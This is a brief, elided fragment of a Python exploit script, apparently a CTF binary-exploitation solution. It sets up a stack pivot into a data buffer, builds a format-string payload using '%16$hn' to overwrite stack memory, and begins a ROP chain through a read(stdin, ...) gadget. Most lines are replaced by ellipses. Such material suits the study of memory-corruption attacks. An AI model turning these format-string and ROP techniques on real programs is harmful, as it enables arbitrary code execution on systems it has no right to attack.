...
def exploit_attempt():
    try:
        ...
        PIVOT_BUF = 0x202238 # target_elf.symbols['data'] + 0x1F8
        ...
        io.recvuntil(b': ')
        payload = '%'+str(stack & 0xffff)+'c%16$hn'
        ...
        pay1 += p64(base + 0x000a68)  # 0x000a4a read(stdin, data, 0x400) ; ret
